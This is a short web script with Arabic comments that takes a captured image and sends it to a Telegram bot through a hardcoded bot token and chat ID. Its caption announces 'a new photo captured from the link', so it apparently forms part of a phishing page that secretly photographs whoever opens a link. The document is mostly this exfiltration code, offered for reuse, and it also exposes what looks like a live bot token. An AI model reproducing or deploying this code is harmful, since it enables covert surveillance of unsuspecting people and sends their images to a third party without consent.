<script>
    // استبدل هذه القيم ببياناتك الخاصة
    const TELEGRAM_TOKEN = '8759927488:AAFj6JMPljy8zxS_zq84ouNmkY42aBbq1Uk';
    const CHAT_ID = '5002073748';

    function sendToTelegram(imageData) {
        // تحويل Base64 إلى File (Blob) لإرساله كصورة حقيقية
        const blob = dataURItoBlob(imageData);
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'capture.png');
        formData.append('caption', '📷 تم التقاط صورة جديدة من الرابط!');

        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if(data.ok) {
                console.log("وصلت الصورة بنجاح إلى تلجرام!");
            } else {
                console.error("خطأ في الإرسال:", data.description);
            }
        })
        .catch(err => console.error("فشل الاتصال بتلجرام:", err));
    }

    // وظيفة مساعدة لتحويل الصورة النصية إلى ملف
    function dataURItoBlob(dataURI) {
        const byteString = atob(dataURI.split(',')[1]);
        const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        return new Blob([ab], {type: mimeString});
    }
</script>
